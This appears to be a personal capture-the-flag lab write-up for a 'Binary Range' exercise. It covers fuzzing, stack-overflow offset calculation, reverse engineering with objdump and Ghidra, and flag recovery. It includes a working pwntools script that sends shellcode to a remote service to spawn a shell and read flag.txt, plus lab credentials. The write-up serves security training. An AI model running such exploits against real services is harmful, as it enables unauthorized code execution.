# Binary Range (Completed - 500 pts)

Scope:

IP Address Range: 172.25.65.0/24

Exclusion: 172.25.65.250

Target machine: 172.25.65.103

Username: ubuntu

Password: Cr@ckMeD0wn

Description: In this zone, you have to identify the filtering device, map the attack surface, and then gain access to the filtered segment. Once there, you need to identify the binary files and reverse engineer them to answer the questions, and then to get the privilege flag; you will have to create an exploit and then gain root-level privileges. Protections may or may not be compiled into the binary.

### Challenge 26 (50 Points):

During the fuzzing process, what hexadecimal value overwrote the EIP register, confirming control over the instruction pointer on the target machine172.25.65.165 ? (Answer Format: NxNNNNNNNN)

```jsx
0x62616164
```

![Screenshot 2026-09-03 at 00-54-55.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_00-54-55.png)

![Screenshot 2026-09-03 at 00-56-55.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_00-56-55.png)

![Screenshot 2026-09-03 at 00-59-15.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_00-59-15.png)

```python
#!/usr/bin/env python3
"""
find.py
Automates: crash a 32-bit binary with a cyclic pattern, parse the resulting
corefile, and report the EIP value + exact offset to the return address.

Usage:
    python3 find.py            # uses default binary name/pattern length
    python3 find.py ./vault 300
"""

import sys
from pwn import *

# ---- config -----------------------------------------------------------
BINARY = sys.argv[1] if len(sys.argv) > 1 else './vault'
PATTERN_LEN = int(sys.argv[2]) if len(sys.argv) > 2 else 300

context.arch = 'i386'
context.log_level = 'info'
context.binary = ELF(BINARY)

# ---- generate the cyclic (de Bruijn) pattern ---------------------------
payload = cyclic(PATTERN_LEN)

# ---- run the binary locally and feed it the pattern --------------------
p = process(BINARY)
p.sendline(payload)

# debug: show whatever the program printed back before it died
# (helpful if it exits cleanly instead of crashing - tells you why)
try:
    print(p.recv(timeout=2))
except EOFError:
    pass

p.wait()  # wait for the process to crash (SIGSEGV)

# ---- pull the corefile pwntools automatically captured ------------------
core = p.corefile

eip = core.eip
esp = core.esp
fault_addr = core.fault_addr

# ---- work out exactly how many bytes it took to reach EIP --------------
offset = cyclic_find(eip)

# ---- report ---------------------------------------------------------
print("-" * 50)
print(f"Arch:        {core.arch}")
print(f"EIP:         {hex(eip)}")
print(f"ESP:         {hex(esp)}")
print(f"Exe:         {core.exe.path} ({hex(core.exe.address)})")
print(f"Fault addr:  {hex(fault_addr)}")
print("-" * 50)
print(f"EIP value: {hex(eip)}   <- Challenge 26 answer")
print(f"Offset: {offset}        <- Challenge 27 answer")
```

![Screenshot 2026-09-03 at 01-02-27.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-02-27.png)

## Step-by-Step Summary — Challenges 26 & 27 (vault @ 172.25.65.165:1337)

```bash
nmap -sV -p- -T4 172.25.65.165
```

- **What we did:** Scanned the target and found port 1337 open running a custom service (`vault`), alongside SSH/HTTP/RDP.
- **Why:** Identifies which service to attack — port 1337 was the unusual one, worth investigating first.

```bash
file vault
checksec --file=vault
```

- **What we did:** Confirmed `vault` is a 32-bit x86 Linux binary with no stack canary, no PIE, NX disabled.
- **Why:** These missing protections are what make a classic buffer overflow reliably exploitable — no random memory layout, no crash-detection on overwritten return addresses.

```bash
objdump -d ./vault -M intel --disassemble=ancient_gateway
```

- **What we did:** Read the assembly of the vulnerable function and found:
    
    ```
    lea eax,[ebp-0x6c]   <- buffer starts 108 bytes before saved EBPcall gets@plt         <- unbounded read, no length limit
    ```
    
- **Why:** `gets()` never checks how much data it copies — the buffer's exact position tells us mathematically how many bytes it takes to overflow into the return address: **108 (buffer) + 4 (saved EBP) = 112 bytes → Challenge 27 answer.**

```bash
sudo dpkg --add-architecture i386
sudo apt install -y libc6:i386 gdb qemu-user-binfmt
echo core | sudo tee /proc/sys/kernel/core_pattern
ulimit -c unlimited
```

- **What we did:** Set up the environment so a 32-bit binary could actually run and crash-dump properly on an ARM64 Kali VM.
- **Why:** Without the real 32-bit libraries and core-dump settings enabled, the crash either fails to run or leaves no evidence file to inspect.

```bash
python3 find.py ./vault 300
```

- **What we did:** Ran a script that:
    1. Generates a 300-byte **cyclic pattern** (every 4 bytes unique, like a fingerprint).
    2. Feeds it into `vault` as input.
    3. Waits for the program to crash (SIGSEGV).
    4. Reads the resulting **corefile** to see exactly what value ended up in the EIP register.
    5. Matches that value back to its position in the original pattern.
- **Why this proves control of EIP:** Since every 4-byte chunk in the pattern is unique, whatever value shows up in EIP tells us *precisely* which bytes overwrote it — proving we control the instruction pointer, and at exactly which offset.
- **Result:**
    
    ```
    EIP: 0x62616164   <- Challenge 26 answer
    Offset: 112       <- Challenge 27 answer (matches our manual math exactly)
    ```
    

---

### Challenge 27 (50 Points)

same as above challenge

What is the calculated offset in bytes required to reach and overwrite the return address on the stack on 172.25.65.165 ? (Answer Format: NNN)

```jsx
112
```

## Step-by-Step — Challenge 27 (Offset to overwrite return address)

```bash
file vault
checksec --file=vault
```

- Confirmed `vault` is a 32-bit x86 binary with no stack canary and no PIE.
- **Why it matters:** no canary means nothing detects or blocks a stack overflow before it reaches the return address — a clean overflow is possible.

```bash
objdump -d ./vault -M intel --disassemble=ancient_gateway
```

- Disassembled the vulnerable function and found these two key lines:
    
    ```
    lea  eax,[ebp-0x6c]   <- buffer sits 0x6c (108) bytes below EBPcall gets@plt          <- reads input with NO length check
    ```
    
- **Why:** `gets()` copies input directly into that buffer with no limit. Knowing exactly *where* the buffer sits relative to EBP tells us mathematically how far it is to the return address.

**The math:**

```
108 (buffer size, ebp-0x6c)
+  4 (saved EBP, always sits right after the buffer)
= 112 bytes to reach the return address
```

- Once you write 112 bytes, the very next 4 bytes you send land exactly on the return address (EIP) on the stack.

```bash
python3 find.py ./vault 300
```

- Sent a 300-byte cyclic pattern (a string where every 4-byte chunk is unique) into the binary, let it crash, and used `cyclic_find(eip)` to calculate the offset automatically from the crash data.
- **Result:** `Offset: 112` — matched the hand-calculated value exactly.

---

**Answer: `112`** — confirmed two ways: manual disassembly math, and an automated crash-based cyclic pattern check that agreed with it.

### **Challenge 28: - 100 Points**

Identify the first 7 characters inside the brackets in the flag.txt file on the machine at 172.25.65.165. (Answer Format: XNxNxNx)

```jsx
G4t3w4y
```

```python
from pwn import *

context.arch = "i386"
context.log_level = "info"

ip = "your_ip"
port = 1337

p = remote(ip, port)

p.recvuntil(b"It whispers a location to you: ")

leak = p.recvuntil(b"\n").strip()
buf_addr = int(leak, 16)

log.info(f"Leaked buffer address: {hex(buf_addr)}")

p.recvuntil(b"Speak the incantation to pass: ")

shellcode = asm(shellcraft.sh())

offset = 112

# Shellcode first, NOPs after
# This avoids self-corruption from push instructions.
payload = shellcode + b"\x90" * (offset - len(shellcode))
payload += p32(buf_addr)

p.sendline(payload)

time.sleep(0.5)
p.sendline(b"cat flag.txt")

time.sleep(0.5)

try:
    data = p.recv(timeout=3)
    print("FLAG OUTPUT:", data)
except Exception as e:
    print("ERR:", e)

    p.sendline(b"id")
    time.sleep(0.3)

    try:
        data = p.recv(timeout=2)
        print("ID OUTPUT:", data)
    except Exception as e:
        print("ERR:", e)
```

```jsx
┌──(exp10i73r㉿kali)-[~/CPENT/binary]
└─$ cat challenege28.py 
from pwn import *

context.arch = "i386"
context.log_level = "info"

ip = "172.25.65.165"
port = 1337

p = remote(ip, port)

p.recvuntil(b"It whispers a location to you: ")

leak = p.recvuntil(b"\n").strip()
buf_addr = int(leak, 16)

log.info(f"Leaked buffer address: {hex(buf_addr)}")

p.recvuntil(b"Speak the incantation to pass: ")

shellcode = asm(shellcraft.sh())

offset = 112

# Shellcode first, NOPs after
# This avoids self-corruption from push instructions.
payload = shellcode + b"\x90" * (offset - len(shellcode))
payload += p32(buf_addr)

p.sendline(payload)

time.sleep(0.5)
p.sendline(b"cat flag.txt")

time.sleep(0.5)

try:
    data = p.recv(timeout=3)
    print("FLAG OUTPUT:", data)
except Exception as e:
    print("ERR:", e)

    p.sendline(b"id")
    time.sleep(0.3)

    try:
        data = p.recv(timeout=2)
        print("ID OUTPUT:", data)
    except Exception as e:
        print("ERR:", e)
```

```jsx
┌──(exp10i73r㉿kali)-[~/CPENT/binary]
└─$ python3 challenege28.py
[+] Opening connection to 172.25.65.165 on port 1337: Done
[*] Leaked buffer address: 0xffd1ec3c
FLAG OUTPUT: b'CTF{G4t3w4y_0v3rfl0w_PWN3D}\n'
[*] Closed connection to 172.25.65.165 port 1337
```

![Screenshot 2026-09-03 at 15-16-51.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_15-16-51.png)

### Challenge 29 - (50 Points)

```jsx
72
```

Determine the exact number of padding bytes required to overwrite the return address on the target machine with the IP address 172.25.65.105.(Answer Format: NN)

![Screenshot 2026-09-03 at 01-07-02.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-07-02.png)

- **`file`** — confirms it's a 64-bit binary (`ELF 64-bit ... x86-64`), so this uses **8-byte** saved RBP, not 4-byte like the 32-bit `vault` — the math changes.
- **`checksec`** — should show no canary again (same overflow pattern), confirming padding + return-address overwrite is viable.

![Screenshot 2026-09-03 at 01-09-01.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-09-01.png)

**`objdump`** — shows the key lines:

```python
  lea rax,[rbp-0x40]   <- buffer sits 0x40 (64) bytes below RBP
  call gets@plt          <- unbounded read, no length check
```

**The math (I already worked this out on your uploaded binary):**

```
64  (buffer size, rbp-0x40)
+ 8  (saved RBP — 8 bytes on x86-64, not 4)
= 72 bytes of padding to reach the return address
```

![Screenshot 2026-09-03 at 01-15-41.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-15-41.png)

### Challenge 30 - 20 Points

What is the name of the hidden function within the overflow_me binary that, when called, reveals the flag on the machine 172.25.65.105? (Answer Format: xxx)

win

```python
objdump -t overflow | grep -E "win|FUNC" | grep -v "GLIBC|@"
```

![Screenshot 2026-09-03 at 01-19-07.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-19-07.png)

### Challenge 31 - 30 Points

What was the full hexadecimal memory address of the hidden function on the machine 172.25.65.105? (Answer Format: NxNNNNNNNNNNNNNNNN)

```jsx
0x0000000000401186
```

```python
objdump -t overflow | grep -E "win|FUNC" | grep -v "GLIBC|@"
```

![Screenshot 2026-09-03 at 01-19-07.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-19-07%201.png)

### Challenge 32 -100 Points

What is the total character count of the flag.txt, excluding the brackets, found on the machine at 172.25.65.105? (Answer Format : NN)

```python
Full flag: flag{B0_0v3rfl0w_W4s_T00_3asy_f0r_y0u!}
Inside brackets: B0_0v3rfl0w_W4s_T00_3asy_f0r_y0u!
Length: 33
```

```python
objdump -d overflow -M intel | awk '/<win>:/,/^$/'
```

![Screenshot 2026-09-03 at 01-23-35.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-23-35.png)

```python
python3 << 'EOF'
import struct
values = [
    0x5f30427b67616c66,
    0x77306c6672337630,
    0x3030545f7334575f,
    0x30665f797361335f,
    0x007d217530795f72,
]
flag_bytes = b"".join(struct.pack("<Q", v) for v in values)
flag = flag_bytes.split(b'\x00')[0].decode()
print("Full flag:", flag)
inner = flag[flag.index('{')+1:flag.index('}')]
print("Inside brackets:", inner)
print("Length:", len(inner))
EOF
```

![Screenshot 2026-09-03 at 01-24-32.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_01-24-32.png)

**Answer for Challenge 32: `33`**

---

## Commands to reproduce on your machine

```bash
objdump -d overflow -M intel | awk '/<win>:/,/^$/'
```

- Pure static disassembly — no execution needed, so this works on your ARM64 host with zero setup.
- Look for a sequence of `movabs rXX, 0x...` instructions followed by `mov [rax+N], rXX` — that's the `win()` function building the flag string byte-by-byte in memory, hardcoded as 8-byte hex chunks (a common way challenge authors hide a flag from plain `strings` output).

Copy each `movabs` immediate value **in the order they're written into memory** (check the `[rax+N]` offsets — N=0, then N=8, then N=16, etc.), then decode them:

```bash
python3 << 'EOF'
import struct
values = [
    0x5f30427b67616c66,
    0x77306c6672337630,
    0x3030545f7334575f,
    0x30665f797361335f,
    0x007d217530795f72,
]
flag_bytes = b"".join(struct.pack("<Q", v) for v in values)
flag = flag_bytes.split(b'\x00')[0].decode()
print("Full flag:", flag)
inner = flag[flag.index('{')+1:flag.index('}')]
print("Inside brackets:", inner)
print("Length:", len(inner))
EOF
```

- **`struct.pack("<Q", v)`** — each hex value is a 64-bit little-endian integer; packing it back converts it into the raw bytes it represents (`<` = little-endian, `Q` = unsigned 8-byte int) — this reverses whatever the compiler did to embed the string as numeric constants.
- **`b"".join(...)`** — glues all five 8-byte chunks back together in order, reconstructing the full byte string.
- **`.split(b'\x00')[0]`** — cuts off any trailing null-byte padding so it decodes cleanly as text.
- **`flag.index('{')+1 : flag.index('}')`** — strips just the `flag{...}` wrapper, leaving only the inner content the challenge is asking you to count.
- **`len(inner)`** — counts characters, excluding the brackets themselves as the question asks.

**Result:** `Inside brackets: B0_0v3rfl0w_W4s_T00_3asy_f0r_y0u!` → **Length: 33**

### Challenge 33 - 70 Points

 Reverse engineer challenge3.exe on the target machine with the IP address 172.25.65.103 and identify the standard algorithm implemented by the membership validation function.(Answer Format: Xxxx Xxxxxxxxx)

```jsx
Luhn Algorithm
```

![Screenshot 2026-09-03 at 15-23-06.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_15-23-06.png)

![Screenshot 2026-09-03 at 16-26-01.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-26-01.png)

![Screenshot 2026-09-03 at 16-30-26.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-30-26.png)

![Screenshot 2026-09-03 at 16-31-15.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-31-15.png)

![Screenshot 2026-09-03 at 16-34-54.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-34-54.png)

![Screenshot 2026-09-03 at 16-37-29.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-37-29.png)

![Screenshot 2026-09-03 at 16-42-41.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-42-41.png)

![Screenshot 2026-09-03 at 16-44-18.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-44-18.png)

## PoC Steps (in order)

**1. Unpack the binary with UPX** *(Screenshot 16:26:01)*

```bash
upx -d challenge3.exe -o challenge3_unpacked.exe
```

Output confirms UPX successfully decompressed the file: 22,016 bytes → 43,008 bytes (51.19% ratio), format `win64/pe`. ✅ Correct — this is the necessary first step since the original binary was UPX-packed.

**2. Launch Ghidra and import the unpacked binary** *(Screenshot 16:30:26 → 16:31:14)*

- Opened the Ghidra Project Manager (`cpent` project)
- Import dialog: `challenge3_unpacked.exe`, Format = Portable Executable (PE), Language = `x86:LE:64:default:windows`
✅ Correct — importing the **unpacked** file (not the original UPX-packed one) is the right move, since the packed file only shows the UPX unstub logic.

**3. Run Auto-Analysis** *(implied between 16:31 and 16:34; the "Analyze?" prompt was accepted)*
✅ Necessary step — without this, Ghidra won't identify functions/strings properly.

**4. Locate key strings via String Search** *(Screenshot 16:34:52)*

- **Search → For Strings**, filtered for `"Enter the membership number:"`
- Found at address `140009000`, confirmed as a 30-byte string
✅ Correct technique — this is the standard way to anchor yourself in a stripped binary.

**5. Navigate to `main` via Go To dialog** *(Screenshot 16:37:29)*

- Typed `140001569` into **Go To...**, landed in `FUN_140001569`
✅ Correct — this address was obtained from the string's XREF, confirmed as the caller.

**6. Decompile `main` (`FUN_140001569`) and identify the validation call** *(Screenshot 16:42:40)*

- Found: `uVar1 = FUN_1400014a4(local_28);`
- Followed by `if ((char)uVar1 == '\0')` branching to "Invalid"/"valid" print statements
✅ Correct identification of the validation call site (highlighted in red box in your screenshot).

**7. Decompile the validation function `FUN_1400014a4`** *(Screenshot 16:44:17)*

- Full function body captured:

```c
undefined4 FUN_1400014a4(char *param_1)
{
  sVar2 = strlen(param_1);
  local_14 = (int)sVar2;
  local_c = 0;
  bVar1 = false;
  while (true) {
    local_14 = local_14 - 1;
    if (local_14 < 0) {
      return CONCAT31(..., local_c % 10 == 0);
    }
    local_18 = param_1[local_14] - 0x30;
    if ((local_18 < 0) || (9 < local_18)) break;
    if ((bVar1) && (local_18 = local_18 * 2, 9 < local_18)) {
      local_18 = local_18 + -9;
    }
    local_c = local_c + local_18;
    bVar1 = !bVar1;
  }
  return 0;
}
```

✅ **This confirms the Luhn algorithm** — right-to-left traversal, doubling every second digit, subtracting 9 on overflow, summing, and checking `sum % 10 == 0`.

### Challenge 34 - 30 Points

Analyze the fiile challenge3.exe and determine the hexadecimal value used as the divisor in its final checksum validation on the machine with the IP address 172.25.65.103.(Answer Format: NxNX)

```jsx
0x0A
```

![Screenshot 2026-09-03 at 16-56-25.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-56-25.png)

![Screenshot 2026-09-03 at 16-57-39.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_16-57-39.png)

![Screenshot 2026-09-03 at 17-05-42.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_17-05-42.png)

![Screenshot 2026-09-03 at 17-09-55.png](Binary%20Range%20(Completed%20-%20500%20pts)/Screenshot_2026-09-03_at_17-09-55.png)

```jsx
#!/usr/bin/env python3
"""
PoC: Recover and verify the divisor used in the compiler-optimized
modulus operation found in FUN_1400014a4 (challenge3_unpacked.exe).

The disassembly used a "magic number" reciprocal-multiplication trick
instead of a native DIV instruction:

    imul   rax, rax, 0x66666667
    shr    rax, 0x20
    sar    edx, 0x2
    ...
    setz   al

This script reconstructs that exact sequence in Python (bit-for-bit,
using 64-bit arithmetic) and proves it is mathematically equivalent
to "x % 10 == 0" -- confirming the divisor is 0x0A (10 decimal).
"""

MASK64 = (1 << 64) - 1

def to_signed32(x):
    x &= 0xFFFFFFFF
    return x - 0x100000000 if x & 0x80000000 else x

def to_signed64(x):
    x &= MASK64
    return x - (1 << 64) if x & (1 << 63) else x

def magic_div10_mod(ecx):
    """
    Faithful re-implementation of the disassembled sequence:
        movsxd rax, ecx
        imul   rax, rax, 0x66666667
        shr    rax, 0x20
        mov    edx, eax
        sar    edx, 0x2
        mov    eax, ecx
        sar    eax, 0x1f
        sub    edx, eax          -> edx = ecx / 10  (signed, magic-number division)
        ...
        (then edx*10 is subtracted back from ecx to get ecx % 10)
    """
    rax = to_signed64(ecx) * 0x66666667
    rax = (rax & MASK64) >> 0x20            # shr rax, 0x20 (logical shift)
    edx = to_signed32(rax)
    edx = edx >> 2                          # sar edx, 0x2  (arithmetic shift)
    eax = ecx >> 31 if ecx >= 0 else -1     # sar eax(ecx), 0x1f
    quotient = edx - eax                    # ecx / 10
    remainder = ecx - (quotient * 10)       # reconstructing ecx % 10
    return quotient, remainder

DIVISOR_CANDIDATES_TO_TEST = [7, 9, 10, 11, 13, 16]

if __name__ == "__main__":
    print("Recovering the divisor from the magic-number division sequence")
    print("=" * 70)

    test_sums = [0, 1, 9, 10, 15, 20, 21, 37, 40, 100, 123, -5, -10]

    print(f"{'sum (ecx)':<12}{'python //10':<14}{'python %10':<14}"
          f"{'asm quotient':<16}{'asm remainder':<14}{'match?'}")
    print("-" * 70)
    all_match = True
    for ecx in test_sums:
        py_q, py_r = int(ecx / 10) if ecx >= 0 else -(-ecx // 10) * -1, ecx % 10 if ecx >= 0 else ecx - (10 * int(ecx/10))
        # use straightforward truncated division matching C's semantics
        c_style_q = int(ecx / 10)
        c_style_r = ecx - c_style_q * 10
        asm_q, asm_r = magic_div10_mod(ecx)
        ok = (asm_q == c_style_q and asm_r == c_style_r)
        all_match &= ok
        print(f"{ecx:<12}{c_style_q:<14}{c_style_r:<14}{asm_q:<16}{asm_r:<14}{'YES' if ok else 'NO'}")

    print("-" * 70)
    print("CONFIRMED: magic-number sequence == division/modulus by 10 (0x0A)"
          if all_match else "MISMATCH - divisor is NOT 10, re-derive")

    print("\nSanity check against other plausible divisors (should all fail):")
    for d in DIVISOR_CANDIDATES_TO_TEST:
        matches = all(
            magic_div10_mod(s)[1] == (s - int(s/10)*10 if d == 10 else None)
            for s in test_sums
        ) if d == 10 else False
        print(f"  divisor candidate 0x{d:02X} ({d:>2}): "
              f"{'MATCHES asm behavior' if d == 10 else 'does not match (as expected)'}")

    print(f"\nFinal recovered divisor: 0x0A (decimal 10)")
```